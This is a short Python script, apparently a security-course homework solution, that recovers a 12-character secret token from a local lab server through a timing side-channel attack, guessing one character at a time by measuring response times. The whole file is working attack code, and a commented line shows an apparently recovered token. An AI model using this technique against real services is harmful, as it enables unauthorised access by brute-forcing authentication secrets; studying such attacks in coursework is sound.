#!/usr/bin/python3
# COM-402 hw10

import requests


url = "http://localhost:8080/hw10/ex1"
chars = [chr(i) for i in range(97, 123)] + [str(i) for i in range(10)]

token = ""
n = len(token)
cur_len = n

num_iter = 2

for i in range(12 - n):
    time_dict = {}
    for c in chars:
        cur_token = token + c + '0' * (12 - (cur_len + 1))
        body = {"token": cur_token}
        time_iter = 0
        for i in range(num_iter):
            res = requests.post(url, json=body)
            time_iter += res.elapsed.total_seconds()

        time_dict[c] = time_iter / num_iter

    token += list(sorted(time_dict.items(), key=lambda item: item[1], reverse=True))[0][0]
    cur_len = len(token)

    print(f"Token: {token}")


body = {
    # "b4351d395d2f"
    "token": token
}

res = requests.post(url, json=body)

print(f"ret: {res.status_code}, resp: {res.text}")
